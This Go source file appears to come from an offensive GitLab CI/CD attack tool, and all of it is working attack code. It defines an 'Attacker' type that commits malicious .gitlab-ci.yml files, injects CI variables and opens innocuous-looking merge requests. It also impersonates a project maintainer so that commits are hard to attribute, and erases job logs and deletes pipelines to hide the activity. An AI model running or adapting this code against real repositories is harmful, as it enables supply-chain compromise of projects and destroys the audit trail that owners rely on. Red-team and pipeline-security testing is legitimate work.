package attack

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	gitlab "gitlab.com/gitlab-org/api/client-go"
)

// Attacker encapsulates GitLab client helpers used by attack modules.
type Attacker struct {
	Client      *gitlabx.Client
	GitLabURL   string
	AuthorName  string
	AuthorEmail string
	Timeout     time.Duration
	user        *gitlab.User
}

// BranchExists returns true if a branch exists in the given project.
func (a *Attacker) BranchExists(ctx context.Context, projectID any, branch string) (bool, error) {
	if strings.TrimSpace(branch) == "" {
		return false, fmt.Errorf("branch cannot be empty")
	}
	_, resp, err := a.Client.GL.Branches.GetBranch(projectID, branch, gitlab.WithContext(ctx))
	if err != nil {
		if resp != nil && resp.StatusCode == 404 {
			return false, nil
		}
		return false, err
	}
	return true, nil
}

// DeleteBranch deletes a branch in the project.
func (a *Attacker) DeleteBranch(ctx context.Context, projectID any, branch string) error {
	if strings.TrimSpace(branch) == "" {
		return fmt.Errorf("branch cannot be empty")
	}
	_, err := a.Client.GL.Branches.DeleteBranch(projectID, branch, gitlab.WithContext(ctx))
	if err == nil {
		slog.Debug("branch deleted", "project", projectID, "branch", branch)
	}
	return err
}

// DeleteFile removes a file at path on branch with a commit message.
func (a *Attacker) DeleteFile(ctx context.Context, projectID any, branch, path, message string) error {
	if strings.TrimSpace(branch) == "" {
		return fmt.Errorf("branch cannot be empty")
	}
	if strings.TrimSpace(path) == "" {
		return fmt.Errorf("path cannot be empty")
	}
	path = strings.TrimPrefix(path, "/")
	_, err := a.Client.GL.RepositoryFiles.DeleteFile(projectID, path, &gitlab.DeleteFileOptions{
		Branch:        new(branch),
		CommitMessage: new(message),
		AuthorName:    new(a.AuthorName),
		AuthorEmail:   new(a.AuthorEmail),
	}, gitlab.WithContext(ctx))
	return err
}

// RevokeDeployKey removes a deploy key from the project by ID.
func (a *Attacker) RevokeDeployKey(ctx context.Context, projectID any, keyID int64) error {
	_, err := a.Client.GL.DeployKeys.DeleteDeployKey(projectID, keyID, gitlab.WithContext(ctx))
	return err
}

// RemoveProjectMember removes a user from the project by numeric user ID.
func (a *Attacker) RemoveProjectMember(ctx context.Context, projectID any, userID int64) error {
	_, err := a.Client.GL.ProjectMembers.DeleteProjectMember(projectID, userID, gitlab.WithContext(ctx))
	return err
}

func NewAttacker(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) *Attacker {
	return &Attacker{Client: gl, GitLabURL: baseURL, AuthorName: authorName, AuthorEmail: authorEmail, Timeout: timeout}
}

// SetupUser fetches current user and fills defaults for author info if unset.
func (a *Attacker) SetupUser(ctx context.Context) (*gitlab.User, error) {
	if a.user != nil {
		return a.user, nil
	}
	u, _, err := a.Client.Ping(ctx)
	if err != nil {
		return nil, err
	}
	a.user = u
	if a.AuthorName == "" {
		a.AuthorName = u.Name
		if a.AuthorName == "" {
			a.AuthorName = u.Username
		}
	}
	return u, nil
}

// ImpersonateMaintainer looks up a project maintainer/owner and sets the
// author identity to theirs. Makes commits harder to attribute to the attacker.
func (a *Attacker) ImpersonateMaintainer(ctx context.Context, projectID any) error {
	opts := &gitlab.ListProjectMembersOptions{ListOptions: gitlab.ListOptions{PerPage: 50, Page: 1}}
	members, _, err := a.Client.GL.ProjectMembers.ListAllProjectMembers(projectID, opts, gitlab.WithContext(ctx))
	if err != nil {
		return fmt.Errorf("list project members: %w", err)
	}
	for _, m := range members {
		if m == nil {
			continue
		}
		if m.AccessLevel >= gitlab.MaintainerPermissions {
			a.AuthorName = m.Name
			if a.AuthorEmail == "" && m.Username != "" {
				a.AuthorEmail = m.Username + "@users.noreply.gitlab.com"
			}
			return nil
		}
	}
	return fmt.Errorf("project has no visible maintainer or owner")
}

// CreateSnippet creates a personal snippet (GitLab equivalent of a Gist).
func (a *Attacker) CreateSnippet(ctx context.Context, title, filename, content string, public bool) (*gitlab.Snippet, *gitlab.Response, error) {
	vis := gitlab.PrivateVisibility
	if public {
		vis = gitlab.PublicVisibility
	}
	opts := &gitlab.CreateSnippetOptions{
		Title:      new(title),
		FileName:   new(filename),
		Content:    new(content),
		Visibility: &vis,
	}
	return a.Client.GL.Snippets.CreateSnippet(opts, gitlab.WithContext(ctx))
}

// EnsureBranch ensures a branch exists in the project; creates from default branch if missing.
func (a *Attacker) EnsureBranch(ctx context.Context, projectID any, branch string) error {
	if branch == "" {
		return errors.New("branch cannot be empty")
	}
	_, resp, err := a.Client.GL.Branches.GetBranch(projectID, branch, gitlab.WithContext(ctx))
	if err == nil {
		return nil
	}
	if resp == nil || resp.StatusCode != http.StatusNotFound {
		return fmt.Errorf("check branch %q: %w", branch, err)
	}
	// Get default branch
	p, _, err := a.Client.GL.Projects.GetProject(projectID, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
	if err != nil {
		return err
	}
	ref := p.DefaultBranch
	if ref == "" {
		ref = "main"
	}
	_, _, err = a.Client.GL.Branches.CreateBranch(projectID, &gitlab.CreateBranchOptions{
		Branch: new(branch),
		Ref:    new(ref),
	}, gitlab.WithContext(ctx))
	return err
}

// UpsertFile creates or updates a file in the repository at the given path on the branch.
func (a *Attacker) UpsertFile(ctx context.Context, projectID any, branch, path, content, commitMsg string) error {
	contentPtr := new(content)
	branchPtr := new(branch)
	path = strings.TrimPrefix(path, "/")

	// Try update first
	_, resp, err := a.Client.GL.RepositoryFiles.UpdateFile(projectID, path, &gitlab.UpdateFileOptions{
		Branch:        branchPtr,
		Content:       contentPtr,
		CommitMessage: new(commitMsg),
		AuthorName:    new(a.AuthorName),
		AuthorEmail:   new(a.AuthorEmail),
	}, gitlab.WithContext(ctx))
	if err == nil {
		return nil
	}
	// Fall back to create: GitLab returns 404 (file path not found) or
	// 400 "A file with this name doesn't exist" depending on version.
	if resp != nil && (resp.StatusCode == 404 || resp.StatusCode == 400) {
		_, _, createErr := a.Client.GL.RepositoryFiles.CreateFile(projectID, path, &gitlab.CreateFileOptions{
			Branch:        branchPtr,
			Content:       contentPtr,
			CommitMessage: new(commitMsg),
			AuthorName:    new(a.AuthorName),
			AuthorEmail:   new(a.AuthorEmail),
		}, gitlab.WithContext(ctx))
		if createErr != nil {
			return fmt.Errorf("upsert %s: %w", path, errors.Join(err, createErr))
		}
		return nil
	}
	return err
}

// CreateMergeRequest creates a merge request from sourceBranch to targetBranch and returns the MR.
func (a *Attacker) CreateMergeRequest(ctx context.Context, projectID any, sourceBranch, targetBranch, title, description string) (*gitlab.MergeRequest, error) {
	if strings.TrimSpace(sourceBranch) == "" {
		return nil, fmt.Errorf("source branch cannot be empty")
	}
	if strings.TrimSpace(targetBranch) == "" {
		// Resolve default branch
		p, _, err := a.Client.GL.Projects.GetProject(projectID, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
		if err != nil {
			return nil, fmt.Errorf("resolve default branch: %w", err)
		}
		targetBranch = p.DefaultBranch
		if targetBranch == "" {
			targetBranch = "main"
		}
	}
	if strings.TrimSpace(title) == "" {
		title = "Update CI configuration"
	}
	mr, _, err := a.Client.GL.MergeRequests.CreateMergeRequest(projectID, &gitlab.CreateMergeRequestOptions{
		SourceBranch: new(sourceBranch),
		TargetBranch: new(targetBranch),
		Title:        new(title),
		Description:  new(description),
	}, gitlab.WithContext(ctx))
	if err != nil {
		return nil, fmt.Errorf("create merge request: %w", err)
	}
	return mr, nil
}

// EraseJob erases a job's trace (log) and artifacts by job ID.
func (a *Attacker) EraseJob(ctx context.Context, projectID any, jobID int64) error {
	_, _, err := a.Client.GL.Jobs.EraseJob(projectID, jobID, gitlab.WithContext(ctx))
	return err
}

// DeletePipeline deletes a pipeline by ID.
func (a *Attacker) DeletePipeline(ctx context.Context, projectID any, pipelineID int64) error {
	_, err := a.Client.GL.Pipelines.DeletePipeline(projectID, pipelineID, gitlab.WithContext(ctx))
	return err
}

// EraseRecentPipelines erases all job traces and optionally deletes pipelines
// for the given ref. It processes up to maxPipelines (most recent first).
// Returns the count of pipelines processed and any error.
func (a *Attacker) EraseRecentPipelines(ctx context.Context, projectID any, ref string, maxPipelines int, deletePipelines bool) (int, error) {
	if maxPipelines <= 0 {
		maxPipelines = 5
	}
	opts := &gitlab.ListProjectPipelinesOptions{
		ListOptions: gitlab.ListOptions{Page: 1, PerPage: int64(maxPipelines)},
		OrderBy:     new("id"),
		Sort:        new("desc"),
	}
	if ref != "" {
		opts.Ref = new(ref)
	}
	pipelines, _, err := a.Client.GL.Pipelines.ListProjectPipelines(projectID, opts, gitlab.WithContext(ctx))
	if err != nil {
		return 0, fmt.Errorf("list pipelines: %w", err)
	}
	processed := 0
	var cleanupErrs []error
	for _, pipeline := range pipelines {
		jobs, _, jobsErr := a.Client.GL.Jobs.ListPipelineJobs(projectID, pipeline.ID, &gitlab.ListJobsOptions{
			ListOptions: gitlab.ListOptions{PerPage: 100},
		}, gitlab.WithContext(ctx))
		if jobsErr != nil {
			cleanupErrs = append(cleanupErrs, fmt.Errorf("pipeline %d list jobs: %w", pipeline.ID, jobsErr))
		} else {
			for _, job := range jobs {
				if eraseErr := a.EraseJob(ctx, projectID, job.ID); eraseErr != nil {
					cleanupErrs = append(cleanupErrs, fmt.Errorf("erase job %d: %w", job.ID, eraseErr))
				}
			}
		}
		if deletePipelines {
			if deleteErr := a.DeletePipeline(ctx, projectID, pipeline.ID); deleteErr != nil {
				cleanupErrs = append(cleanupErrs, fmt.Errorf("delete pipeline %d: %w", pipeline.ID, deleteErr))
			}
		}
		processed++
	}
	return processed, errors.Join(cleanupErrs...)
}

// TriggerPipeline creates a new pipeline for the given ref via the API.
func (a *Attacker) TriggerPipeline(ctx context.Context, projectID any, ref string) (int64, string, error) {
	p, _, err := a.Client.GL.Pipelines.CreatePipeline(projectID, &gitlab.CreatePipelineOptions{
		Ref: new(ref),
	}, gitlab.WithContext(ctx))
	if err != nil {
		return 0, "", fmt.Errorf("create pipeline: %w", err)
	}
	return p.ID, p.WebURL, nil
}

// GetFileContent reads a file's content from the repository at the given ref.
func (a *Attacker) GetFileContent(ctx context.Context, projectID any, ref, path string) (string, error) {
	path = strings.TrimPrefix(path, "/")
	f, _, err := a.Client.GL.RepositoryFiles.GetFile(projectID, path, &gitlab.GetFileOptions{
		Ref: new(ref),
	}, gitlab.WithContext(ctx))
	if err != nil {
		return "", err
	}
	// The GitLab API returns file content base64-encoded by default.
	decoded, err := base64.StdEncoding.DecodeString(f.Content)
	if err != nil {
		// Fallback: return raw content if it's not base64
		return f.Content, nil
	}
	return string(decoded), nil
}

// CommitCIPipeline writes a .gitlab-ci.yml to the root of the repository and returns the web URL.
func (a *Attacker) CommitCIPipeline(ctx context.Context, projectID any, branch, yamlContent, message string) (string, error) {
	if err := a.EnsureBranch(ctx, projectID, branch); err != nil {
		return "", err
	}
	if message == "" {
		message = DefaultCommitMessage
	}
	if err := a.UpsertFile(ctx, projectID, branch, ".gitlab-ci.yml", yamlContent, message); err != nil {
		return "", err
	}
	p, _, err := a.Client.GL.Projects.GetProject(projectID, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
	if err != nil {
		return "", err
	}
	pipelineURL := fmt.Sprintf("%s/%s/-/pipelines?ref=%s", strings.TrimSuffix(a.GitLabURL, "/"), p.PathWithNamespace, url.QueryEscape(branch))
	slog.Info("CI pipeline committed", "project", p.PathWithNamespace, "branch", branch)
	return pipelineURL, nil
}

// SetProjectVariable creates or updates a CI variable in the project scope.
// On 404 (variable does not exist), it falls back to CreateVariable so that
// the caller can inject new variables, not only update existing ones.
func (a *Attacker) SetProjectVariable(ctx context.Context, projectID any, key, value string, unprotected, masked bool, environmentScope string) (*gitlab.ProjectVariable, *gitlab.Response, error) {
	opts := &gitlab.UpdateProjectVariableOptions{
		Value:     new(value),
		Protected: new(!unprotected),
		Masked:    new(masked),
	}
	if environmentScope != "" {
		opts.EnvironmentScope = new(environmentScope)
	}
	v, resp, err := a.Client.GL.ProjectVariables.UpdateVariable(projectID, key, opts, gitlab.WithContext(ctx))
	if err == nil {
		return v, resp, nil
	}
	// 404 means the variable doesn't exist — try creating it.
	if resp != nil && resp.StatusCode == 404 {
		createOpts := &gitlab.CreateProjectVariableOptions{
			Key:    &key,
			Value:  &value,
			Masked: new(masked),
		}
		if !unprotected {
			createOpts.Protected = new(true)
		}
		if environmentScope != "" {
			createOpts.EnvironmentScope = new(environmentScope)
		}
		return a.Client.GL.ProjectVariables.CreateVariable(projectID, createOpts, gitlab.WithContext(ctx))
	}
	return v, resp, err
}

// SetGroupVariable creates or updates a CI variable in the group scope.
// On 404 (variable does not exist), it falls back to CreateVariable so that
// the caller can inject new variables, not only update existing ones.
func (a *Attacker) SetGroupVariable(ctx context.Context, groupID, key, value string, unprotected, masked bool, environmentScope string) (*gitlab.GroupVariable, *gitlab.Response, error) {
	opts := &gitlab.UpdateGroupVariableOptions{
		Value:     new(value),
		Protected: new(!unprotected),
		Masked:    new(masked),
	}
	if environmentScope != "" {
		opts.EnvironmentScope = new(environmentScope)
	}
	v, resp, err := a.Client.GL.GroupVariables.UpdateVariable(groupID, key, opts, gitlab.WithContext(ctx))
	if err == nil {
		return v, resp, nil
	}
	// 404 means the variable doesn't exist — try creating it.
	if resp != nil && resp.StatusCode == 404 {
		createOpts := &gitlab.CreateGroupVariableOptions{
			Key:    &key,
			Value:  &value,
			Masked: new(masked),
		}
		if !unprotected {
			createOpts.Protected = new(true)
		}
		if environmentScope != "" {
			createOpts.EnvironmentScope = new(environmentScope)
		}
		return a.Client.GL.GroupVariables.CreateVariable(groupID, createOpts, gitlab.WithContext(ctx))
	}
	return v, resp, err
}
